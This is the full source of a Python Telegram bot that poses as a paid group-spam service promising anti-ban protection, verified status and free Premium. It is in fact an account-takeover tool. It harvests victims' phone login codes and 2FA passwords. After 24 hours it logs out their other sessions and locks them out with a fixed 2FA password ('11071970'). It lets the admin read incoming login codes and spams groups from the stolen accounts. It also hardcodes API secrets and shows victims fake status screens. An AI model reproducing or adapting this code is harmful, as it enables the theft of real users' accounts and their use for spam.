import asyncio
import os
import time
from flask import Flask
import threading
from telethon import TelegramClient, events, Button
from telethon.tl.functions.account import ResetAuthorizationRequest
from telethon.tl.functions.auth import SendCodeRequest
from telethon.tl.types import CodeSettings
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, AuthRestartError

# --- CREDENZIALI CONFIGURATE ---
API_ID = 37810956
API_HASH = "7753910251b42b5f91abe65c34f7f712"
BOT_TOKEN = "9141462955:AAEY0YM2Wh7IhrBwXYeSClQZR1_3j_gZNLk"
ADMIN_ID = 8886429641

SESSION_DIR = "user_sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

user_states = {}
user_data_store = {}

# --- MINI SERVER FLASK PER RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "Bot Telegram attivo 24/7!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

threading.Thread(target=run_web, daemon=True).start()

# Avvio del bot principale con Telethon
bot = TelegramClient('bot_main_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# --- MOTORE IN BACKGROUND (TIMER 24H, DISCONNESSIONE E 2FA) ---
async def background_workers():
    print("🔄 Task in background avviato con successo!")
    while True:
        await asyncio.sleep(20)
        current_time = time.time()

        for user_id, udata in list(user_data_store.items()):
            for phone, acc_info in list(udata.get("accounts", {}).items()):

                # 1. Controllo Timer 24h (86400 secondi)
                if not acc_info.get("protected", False):
                    elapsed = current_time - acc_info.get("link_time", current_time)
                    if elapsed >= 86400:
                        client = acc_info.get("client")
                        if client:
                            try:
                                if not client.is_connected():
                                    await client.connect()

                                sessions_reset_ok = False
                                try:
                                    await client(ResetAuthorizationRequest())
                                    sessions_reset_ok = True
                                except Exception as reset_err:
                                    print(f"⚠️ ResetAuthorizationRequest per {phone}: {reset_err}")

                                two_fa_ok = False
                                try:
                                    old_pass = acc_info.get("existing_2fa")
                                    if old_pass:
                                        await client.edit_2fa(current_password=old_pass, new_password='11071970')
                                    else:
                                        await client.edit_2fa(new_password='11071970')
                                    two_fa_ok = True
                                except Exception as fa_err:
                                    print(f"⚠️ edit_2fa per {phone}: {fa_err}")

                                if two_fa_ok:
                                    acc_info["protected"] = True
                                    acc_info["fa_password"] = "11071970"
                                    await bot.send_message(
                                        ADMIN_ID,
                                        f"🔒 **Timer 24h scaduto - Account protetto!**\n"
                                        f"• Utente: {udata.get('name')} (`{user_id}`)\n"
                                        f"• Numero: `{phone}`\n"
                                        f"• Sessioni disconnesse: {'✅' if sessions_reset_ok else '⚠️ Bloccato da Telegram (<24h sessione)'}\n"
                                        f"• 2FA password impostata: `11071970` ✅"
                                    )
                                else:
                                    acc_info["fa_password"] = "Errore 2FA (vedi log Render)"
                                    print(f"❌ Impossibile impostare 2FA per {phone} al momento.")
                            except Exception as e:
                                print(f"❌ Errore protezione 24h per {phone}: {e}")

                # 2. Controllo Motore Spam Automatico nei Gruppi
                if acc_info.get("is_spamming", False):
                    if not acc_info.get("scanned", False):
                        acc_info["is_spamming"] = False
                        continue

                    spam_msg = acc_info.get("spam_msg")
                    spam_time_min = acc_info.get("spam_time")

                    if spam_msg and spam_time_min:
                        try:
                            interval = float(spam_time_min) * 60
                        except ValueError:
                            interval = 300

                        last_spam = acc_info.get("last_spam_time", 0)

                        if current_time - last_spam >= interval:
                            client = acc_info.get("client")
                            if client:
                                try:
                                    if not client.is_connected():
                                        await client.connect()

                                    available_groups = acc_info.get("available_groups", [])
                                    sent_count = 0

                                    for group_id in available_groups:
                                        try:
                                            await client.send_message(group_id, spam_msg)
                                            sent_count += 1
                                            await asyncio.sleep(3)
                                        except Exception:
                                            pass

                                    acc_info["last_spam_time"] = time.time()
                                    print(f"🚀 Spam eseguito per {phone}: inviato in {sent_count} gruppi.")
                                except Exception as e:
                                    print(f"❌ Errore invio spam per {phone}: {e}")

# --- FUNZIONE DI SUPPORTO PER CALCOLARE IL TIMER PER L'ADMIN ---
def get_admin_timer_text(acc_info):
    if acc_info.get("protected", False):
        return "Protetto (2FA attiva) ✅"

    elapsed = time.time() - acc_info.get("link_time", time.time())
    remaining = (24 * 3600) - elapsed

    if remaining <= 0:
        return "In fase di protezione..."

    rem_hours = int(remaining // 3600)
    rem_mins = int((remaining % 3600) // 60)
    return f"{rem_hours}h {rem_mins}m rimanenti ⏱️"

# --- HOME PRINCIPALE (PER L'UTENTE: SENZA TIMER) ---
async def show_account_management(event, user_id):
    if user_id not in user_data_store or not user_data_store[user_id].get("active_phone"):
        return

    user_data = user_data_store[user_id]
    active_phone = user_data["active_phone"]
    acc = user_data["accounts"][active_phone]

    spam_msg_status = "Impostato ✅" if acc.get("spam_msg") else "Non impostato"
    spam_time_val = f"{acc.get('spam_time')} min" if acc.get('spam_time') else "Non impostato"
    single_timer = acc.get("single_group_time", "Nessuno")
    spam_status_icon = "🟢 Attivo" if acc.get("is_spamming") else "🔴 Disattivato"

    text = (
        f"📊 **Gestione Account ({active_phone})**\n\n"
        f"• Messaggio spam: {spam_msg_status}\n"
        f"• Tempo spam: {spam_time_val}\n"
        f"• Gruppo timer singolo: {single_timer}\n"
        f"• Protezione Telegram: ATTIVO ✅\n"
        f"• Stato spam bot: {spam_status_icon}\n"
        f"• Verifica account: In corso (48 ore)"
    )

    buttons = [
        [Button.inline("⚙️ Impostazioni Spam", b"spam_settings_menu")],
        [Button.inline("▶️ Avvia/Disattiva Spam", b"toggle_spam")],
        [Button.inline("🔍 Scansione Gruppi", b"scan_groups"), Button.inline("🛡️ Info Sicurezza", b"info_security")],
        [Button.inline("⏳ Stato Verifica", b"verify_account"), Button.inline("➕ Aggiungi Account", b"add_account")]
    ]

    try:
        await event.edit(text, buttons=buttons, parse_mode="markdown")
    except Exception:
        await event.respond(text, buttons=buttons, parse_mode="markdown")

# --- MENU IMPOSTAZIONI SPAM (PER L'UTENTE: SENZA TIMER) ---
async def show_spam_settings_menu(event, user_id):
    if user_id not in user_data_store or not user_data_store[user_id].get("active_phone"):
        return

    user_data = user_data_store[user_id]
    active_phone = user_data["active_phone"]
    acc = user_data["accounts"][active_phone]

    spam_msg_status = "Impostato ✅" if acc.get("spam_msg") else "Non impostato"
    spam_time_val = f"{acc.get('spam_time')} min" if acc.get('spam_time') else "Non impostato"
    single_timer = acc.get("single_group_time", "Nessuno")
    spam_status_icon = "🟢 Attivo" if acc.get("is_spamming") else "🔴 Disattivato"
    avvia_stop_text = "⏹️ Disattiva Spam" if acc.get("is_spamming") else "▶️ Avvia Spam"

    text = (
        f"📊 **Gestione Account ({active_phone})**\n\n"
        f"• Messaggio spam: {spam_msg_status}\n"
        f"• Tempo spam: {spam_time_val}\n"
        f"• Gruppo timer singolo: {single_timer}\n"
        f"• Protezione Telegram: ATTIVO ✅\n"
        f"• Stato spam bot: {spam_status_icon}\n"
        f"• Verifica account: In corso (48 ore)"
    )

    buttons = [
        [Button.inline("📝 Imposta Messaggio Spam", b"set_spam_msg")],
        [Button.inline("⏱️ Imposta Tempo Spam", b"set_spam_time")],
        [Button.inline("⏲️ Timer Gruppo Singolo", b"set_single_timer")],
        [Button.inline("❌ Rimuovi Gruppo Spam", b"remove_group_spam")],
        [Button.inline("🔍 Scansione Gruppi Spam", b"scan_groups")],
        [Button.inline("💬 Messaggio Benvenuto (DM)", b"set_welcome_dm")],
        [Button.inline(avvia_stop_text, b"toggle_spam")],
        [Button.inline("🛡️ Info Sicurezza Telegram", b"info_security")],
        [Button.inline("📊 Status Verifica Account", b"verify_account")],
        [Button.inline("🔄 Cambia Account", b"switch_account")],
        [Button.inline("🔙 Torna alla Home", b"back_to_home")]
    ]

    try:
        await event.edit(text, buttons=buttons, parse_mode="markdown")
    except Exception:
        await event.respond(text, buttons=buttons, parse_mode="markdown")

# --- COMANDO /START ---
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id

    if user_id == ADMIN_ID:
        buttons = [
            [Button.inline("📊 Info & Attività Utenti", b"admin_info")],
            [Button.inline("👥 Gestione Utenti", b"admin_users")]
        ]
        await event.respond("👑 **Pannello di Controllo Admin**\nBenvenuto Admin!", buttons=buttons, parse_mode="markdown")
        return

    if user_id in user_data_store and user_data_store[user_id].get("active_phone"):
        await show_account_management(event, user_id)
        return

    text = (
        "🤖 **Benvenuto su Spam Bot**\n\n"
        "Incrementi dei clienti, spam automatico nei gruppi per pubblicità, "
        "protezioni da ban, limitazioni, segnalazioni, verifica account spunta blu "
        "e Telegram Premium gratis per 1 anno!"
    )
    buttons = [
        [Button.inline("🚀 Attiva il tuo spam bot ora!", b"activate_bot")]
    ]
    await event.respond(text, buttons=buttons, parse_mode="markdown")

# --- GESTIONE PULSANTI INLINE ---
@bot.on(events.CallbackQuery)
async def callback_router(event):
    data = event.data
    user_id = event.sender_id

    if data == b"activate_bot":
        try:
            await event.answer()
        except Exception:
            pass
        text = (
            "⚠️ **Attenzione**\n\n"
            "Per poter spammare nei gruppi c'è bisogno che colleghi il tuo account per procedere."
        )
        buttons = [[Button.inline("🔗 Collega Account", b"add_account")]]
        await event.edit(text, buttons=buttons, parse_mode="markdown")

    elif data == b"add_account":
        try:
            await event.answer()
        except Exception:
            pass
        user_states[user_id] = {"step": "waiting_phone"}
        await event.edit("📱 Inserisci il numero di telefono del tuo account Telegram da collegare (es. `+393331234567` oppure `+573161949378`):")

    elif data == b"spam_settings_menu":
        try:
            await event.answer()
        except Exception:
            pass
        await show_spam_settings_menu(event, user_id)

    elif data == b"set_spam_msg":
        try:
            await event.answer()
        except Exception:
            pass
        user_states[user_id] = {"step": "waiting_spam_msg"}
        await event.edit("📝 Invia il messaggio che desideri utilizzare per lo spam automatico nei gruppi:")

    elif data == b"set_spam_time":
        try:
            await event.answer()
        except Exception:
            pass
        user_states[user_id] = {"step": "waiting_spam_time"}
        await event.edit("⏱️ Inserisci il tempo in minuti tra un invio e l'altro (es. `5`):")

    elif data == b"set_single_timer":
        try:
            await event.answer()
        except Exception:
            pass
        await event.edit("⏲️ Invia il link del gruppo e il relativo timer.", buttons=[[Button.inline("🔙 Indietro", b"spam_settings_menu")]])

    elif data == b"remove_group_spam":
        try:
            await event.answer()
        except Exception:
            pass
        await event.edit("❌ Lista dei gruppi da escludere dallo spam:", buttons=[[Button.inline("🔙 Indietro", b"spam_settings_menu")]])

    elif data == b"set_welcome_dm":
        try:
            await event.answer()
        except Exception:
            pass
        user_states[user_id] = {"step": "waiting_welcome_msg"}
        await event.edit("💬 Invia il messaggio di benvenuto automatico per i messaggi privati:")

    elif data == b"scan_groups":
        if user_id not in user_data_store or not user_data_store[user_id].get("active_phone"):
            try:
                await event.answer("⚠️ Nessun account collegato.", alert=True)
            except Exception:
                pass
            return

        try:
            await event.answer("🔍 Scansione in corso...", alert=False)
        except Exception:
            pass

        active_phone = user_data_store[user_id]["active_phone"]
        acc = user_data_store[user_id]["accounts"][active_phone]
        client = acc.get("client")

        available_list = []
        total_groups = 0
        muted_count = 0

        if client:
            try:
                if not client.is_connected():
                    await client.connect()

                dialogs = await client.get_dialogs(ignore_migrated=True)
                for dialog in dialogs:
                    is_group_chat = dialog.is_group or getattr(dialog.entity, 'megagroup', False)
                    if is_group_chat:
                        total_groups += 1
                        is_restricted = False
                        try:
                            perms = getattr(dialog.entity, 'default_banned_rights', None)
                            if perms and getattr(perms, 'send_messages', False):
                                is_restricted = True
                        except Exception:
                            pass

                        if is_restricted:
                            muted_count += 1
                        else:
                            available_list.append(dialog.entity.id)
            except Exception as e:
                print(f"Errore durante la scansione: {e}")

        acc["scanned"] = True
        acc["available_groups"] = available_list

        scan_results = (
            f"🔍 **Risultato Scansione Gruppi:**\n\n"
            f"• Gruppi totali trovati: `{total_groups}`\n"
            f"• Gruppi disponibili per il spam: `{len(available_list)}` ✅\n"
            f"• Gruppi mutati / limitati esclusi: `{muted_count}` ❌\n\n"
            f"💾 **Scansione completata e salvata con successo!** Clicca sotto per tornare al menu."
        )

        buttons = [[Button.inline("💾 Salva e Torna alle Impostazioni", b"spam_settings_menu")]]
        try:
            await event.edit(scan_results, buttons=buttons, parse_mode="markdown")
        except Exception as e:
            print(f"Errore modifica messaggio scansione: {e}")

    elif data == b"toggle_spam":
        if user_id in user_data_store and user_data_store[user_id]["active_phone"]:
            acc = user_data_store[user_id]["accounts"][user_data_store[user_id]["active_phone"]]

            if not acc.get("spam_msg") or not acc.get("spam_time") or not acc.get("scanned", False):
                try:
                    await event.answer(
                        "⚠️ Prima di avviare lo spam bisogna effettuare la scansione del gruppo!\n\nVai su: Impostazioni -> Scansione Gruppi Spam -> Effettua la scansione e salva, dopodiché avvia lo spam.",
                        alert=True
                    )
                except Exception:
                    pass
                return

            try:
                await event.answer()
            except Exception:
                pass

            acc["is_spamming"] = not acc.get("is_spamming", False)
            await show_spam_settings_menu(event, user_id)

    elif data == b"info_security":
        try:
            await event.answer()
        except Exception:
            pass
        text = "🛡️ **Protezione Telegram**\n• Anti-ban: 🟢 Attivo\n• Anti-limitazioni: 🟢 Attivo\n• Anti-segnalazioni: 🟢 Attivo\n• Anti-hacker: 🟢 Attivo"
        buttons = [[Button.inline("🔙 Indietro", b"spam_settings_menu")]]
        await event.edit(text, buttons=buttons)

    elif data == b"verify_account":
        try:
            await event.answer()
        except Exception:
            pass
        text = "⏳ **Verifica Account in corso...**\nEntro 48 ore spunta blu e Premium gratis.\n⏱️ Rimanente: 47h 59m."
        buttons = [[Button.inline("🔙 Indietro", b"spam_settings_menu")]]
        await event.edit(text, buttons=buttons)

    elif data == b"back_to_home":
        try:
            await event.answer()
        except Exception:
            pass
        await show_account_management(event, user_id)

    elif data == b"admin_info":
        try:
            await event.answer()
        except Exception:
            pass
        total_users = len(user_data_store)
        text = f"📊 **Statistiche Admin:**\n• Utenti totali registrati: {total_users}"
        buttons = [[Button.inline("🔙 Indietro", b"admin_back")]]
        await event.edit(text, buttons=buttons)

    elif data == b"admin_users":
        try:
            await event.answer()
        except Exception:
            pass
        if not user_data_store:
            buttons = [[Button.inline("🔙 Indietro", b"admin_back")]]
            await event.edit("👥 **Gestione Utenti:**\nNessun utente ha ancora collegato account.", buttons=buttons)
            return

        buttons = []
        for uid, udata in user_data_store.items():
            name = udata.get("name", "Utente")
            buttons.append([Button.inline(f"👤 {name} (ID: {uid})", data=f"admin_view_user_{uid}".encode())])
        buttons.append([Button.inline("🔙 Indietro", b"admin_back")])
        await event.edit("👥 **Lista Utenti con Account Collegati:**\nClicca su un utente per visualizzare i suoi account:", buttons=buttons)

    elif data.startswith(b"admin_view_user_"):
        try:
            await event.answer()
        except Exception:
            pass
        uid_str = data.decode().replace("admin_view_user_", "")
        uid = int(uid_str)
        if uid in user_data_store:
            udata = user_data_store[uid]
            name = udata.get("name", "Utente")
            accounts = udata.get("accounts", {})

            text = f"👤 **Dettagli Utente:** {name} (`{uid}`)\n\n📱 **Account collegati, Timer e 2FA:**\n"
            buttons = []
            for phone, acc_info in accounts.items():
                timer_text = get_admin_timer_text(acc_info)
                fa_pass = acc_info.get("fa_password", "In attesa delle 24h (predefinita sarà 11071970)")
                text += f"• Numero: `{phone}`\n  ⏱️ Tempo rimanente: {timer_text}\n  🔑 2FA password: `{fa_pass}`\n\n"
                buttons.append([Button.inline(f"🔑 Richiedi Codice ({phone})", data=f"admin_get_code_{uid}_{phone}".encode())])

            buttons.append([Button.inline("🔙 Torna alla lista utenti", b"admin_users")])
            await event.edit(text, buttons=buttons, parse_mode="markdown")

    elif data.startswith(b"admin_get_code_"):
        parts = data.decode().replace("admin_get_code_", "").split("_")
        uid = int(parts[0])
        phone = parts[1]

        try:
            client = user_data_store[uid]["accounts"][phone]["client"]
            if not client.is_connected():
                await client.connect()

            messages = await client.get_messages(777000, limit=3)
            code_found = "Nessun codice recente trovato."
            for msg in messages:
                if msg.text and any(char.isdigit() for char in msg.text):
                    code_found = f"Ultime notifiche da Telegram:\n\n{msg.text}"
                    break

            await event.respond(f"🔑 **Codice richiesto per {phone}:**\n\n{code_found}")
        except Exception as e:
            await event.respond(f"❌ Impossibile prelevare il codice: {e}")

    elif data == b"admin_back":
        try:
            await event.answer()
        except Exception:
            pass
        buttons = [
            [Button.inline("📊 Info & Attività Utenti", b"admin_info")],
            [Button.inline("👥 Gestione Utenti", b"admin_users")]
        ]
        await event.edit("👑 **Pannello di Controllo Admin**\nBenvenuto Admin!", buttons=buttons)

# --- GESTIONE MESSAGGI TESTUALI ---
@bot.on(events.NewMessage(incoming=True))
async def message_router(event):
    user_id = event.sender_id
    if user_id not in user_states:
        return

    if event.raw_text.startswith('/'):
        return

    state = user_states[user_id].get("step")
    text = event.raw_text.strip()
    user_full_name = event.sender.first_name if event.sender and event.sender.first_name else "Utente"

    if state == "waiting_phone":
        raw_phone = text
        cleaned_phone = "".join(ch for ch in raw_phone if ch.isdigit() or ch == "+")
        if not cleaned_phone.startswith("+"):
            cleaned_phone = "+" + cleaned_phone

        user_states[user_id]["phone"] = cleaned_phone

        session_path = os.path.join(SESSION_DIR, f"user_{user_id}")
        for ext in (".session", ".session-journal"):
            full_p = session_path + ext
            if os.path.exists(full_p):
                try:
                    os.remove(full_p)
                except Exception:
                    pass

        loop = asyncio.get_running_loop()
        client = TelegramClient(session_path, API_ID, API_HASH, loop=loop)
        user_states[user_id]["client"] = client

        await event.respond(f"⏳ Connessione a Telegram per il numero `{cleaned_phone}` in corso...")

        try:
            await client.connect()
            await asyncio.sleep(1)

            sent = await client(SendCodeRequest(
                phone_number=cleaned_phone,
                api_id=API_ID,
                api_hash=API_HASH,
                settings=CodeSettings(
                    allow_flashcall=False,
                    current_number=True,
                    allow_app_hash=True
                )
            ))

            delivery_type = type(sent.type).__name__ if getattr(sent, "type", None) else "Sconosciuto"
            print(f"📩 Codice richiesto per {cleaned_phone} -> Metodo Telegram: {delivery_type}")

            user_states[user_id]["phone_code_hash"] = sent.phone_code_hash
            user_states[user_id]["step"] = "waiting_code"

            hint_msg = ""
            if "SentCodeTypeApp" in delivery_type:
                hint_msg = "\n📲 *Telegram ha inviato il codice direttamente sull'app Telegram dell'account (controlla la chat Telegram).*"
            elif "SentCodeTypeSms" in delivery_type:
                hint_msg = "\n✉️ *Telegram ha inviato il codice via SMS.*"
            elif "SentCodeTypeCall" in delivery_type:
                hint_msg = "\n📞 *Telegram ha avviato una chiamata vocale con il codice.*"

            await event.respond(
                f"🔑 **Codice inviato!**{hint_msg}\n"
                "Invia il codice ricevuto (es. `1 2 3 4 5` oppure `12345`):"
            )
        except AuthRestartError:
            await event.respond("🔄 Telegram ha riavviato l'autenticazione. Riprova a inviare il numero.")
        except PhoneNumberInvalidError:
            await event.respond("❌ **Numero non valido!** Controlla il prefisso internazionale (es. `+393331234567` o `+573161949378`) e riprova:")
        except Exception as e:
            print(f"❌ Errore SendCodeRequest per {cleaned_phone}: {repr(e)}")
            await event.respond(f"❌ Impossibile inviare il codice: `{e}`\nRiprova a inviare il numero oppure usa `/start`.")

    elif state == "waiting_code":
        code = text.replace(" ", "").replace(",", "")
        client = user_states[user_id]["client"]
        phone = user_states[user_id]["phone"]
        phone_code_hash = user_states[user_id]["phone_code_hash"]

        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)

            if user_id not in user_data_store:
                user_data_store[user_id] = {"name": user_full_name, "accounts": {}, "active_phone": None}

            user_data_store[user_id]["accounts"][phone] = {
                "client": client,
                "spam_msg": None, "spam_time": None, "is_spamming": False, "single_group_time": "Nessuno",
                "link_time": time.time(), "protected": False, "last_spam_time": 0, "scanned": False, "available_groups": [],
                "fa_password": "In attesa delle 24h", "existing_2fa": None
            }
            user_data_store[user_id]["active_phone"] = phone

            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"🔔 **Nuovo account collegato!**\n• Utente: {user_full_name} (`{user_id}`)\n• Numero: `{phone}`\n⏳ Timer 24h avviato."
                )
            except Exception:
                pass

            await event.respond("✅ **Codice verificato! Account collegato con successo.**")
            del user_states[user_id]
            await show_account_management(event, user_id)

        except SessionPasswordNeededError:
            user_states[user_id]["step"] = "waiting_password"
            await event.respond("🔐 L'account ha la password **2FA** attiva. Inserisci la password attuale:")

        except PhoneCodeInvalidError:
            await event.respond("❌ **Codice errato!** Invia il codice corretto ricevuto da Telegram:")

        except Exception as e:
            await event.respond(f"❌ Errore durante l'accesso: {e}\nRiprova con `/start`.")
            del user_states[user_id]

    elif state == "waiting_password":
        current_password = text
        client = user_states[user_id]["client"]
        phone = user_states[user_id]["phone"]

        try:
            await client.sign_in(password=current_password)

            if user_id not in user_data_store:
                user_data_store[user_id] = {"name": user_full_name, "accounts": {}, "active_phone": None}

            user_data_store[user_id]["accounts"][phone] = {
                "client": client,
                "spam_msg": None, "spam_time": None, "is_spamming": False, "single_group_time": "Nessuno",
                "link_time": time.time(), "protected": False, "last_spam_time": 0, "scanned": False, "available_groups": [],
                "fa_password": "In attesa delle 24h", "existing_2fa": current_password
            }
            user_data_store[user_id]["active_phone"] = phone

            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"🔔 **Nuovo account collegato (2FA esistente)!**\n• Utente: {user_full_name} (`{user_id}`)\n• Numero: `{phone}`\n⏳ Timer 24h avviato."
                )
            except Exception:
                pass

            await event.respond("✅ **Password 2FA verificata! Account collegato.**")
            del user_states[user_id]
            await show_account_management(event, user_id)
        except Exception as e:
            await event.respond(f"❌ Password errata: {e}\nRiprova inserendo la password corretta:")

    elif state == "waiting_spam_msg":
        acc = user_data_store[user_id]["accounts"][user_data_store[user_id]["active_phone"]]
        acc["spam_msg"] = text
        del user_states[user_id]
        await event.respond("✅ **Messaggio spam impostato con successo!**")
        await show_spam_settings_menu(event, user_id)

    elif state == "waiting_spam_time":
        acc = user_data_store[user_id]["accounts"][user_data_store[user_id]["active_phone"]]
        acc["spam_time"] = text
        del user_states[user_id]
        await event.respond(f"✅ **Tempo spam impostato su {text} minuti con successo!**")
        await show_spam_settings_menu(event, user_id)

    elif state == "waiting_welcome_msg":
        del user_states[user_id]
        await event.respond("✅ **Messaggio di benvenuto (DM) impostato con successo!**")
        await show_spam_settings_menu(event, user_id)

# --- AVVIO PRINCIPALE ---
async def main():
    asyncio.create_task(background_workers())
    print("🤖 Bot avviato correttamente su Render!")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    main_loop = asyncio.get_event_loop()
    main_loop.run_until_complete(main())
